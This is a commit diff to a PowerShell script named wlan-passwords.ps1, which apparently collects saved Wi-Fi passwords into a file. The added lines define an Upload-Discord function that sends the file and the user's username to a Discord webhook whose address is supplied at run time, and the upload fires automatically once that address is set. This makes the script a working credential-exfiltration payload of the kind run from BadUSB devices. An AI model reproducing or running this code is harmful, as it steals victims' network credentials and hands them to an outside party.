d2a0d4bc72f3c040d4621ddb913f506273d5ab60
xborz75 <103429301+xborz75@users.noreply.github.com>
2024-05-11 22:03:15 +0200

    Update wlan-passwords.ps1

--- wlan-passwords.ps1
+++ wlan-passwords.ps1
@@ -12,3 +12,28 @@ $output | Out-File -FilePath $outputFilePath -Encoding utf8
 
 # Afficher la sortie à l'écran
 Write-Output "Les informations WLAN ont été enregistrées dans le fichier : $outputFilePath"
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $outputFilePath}
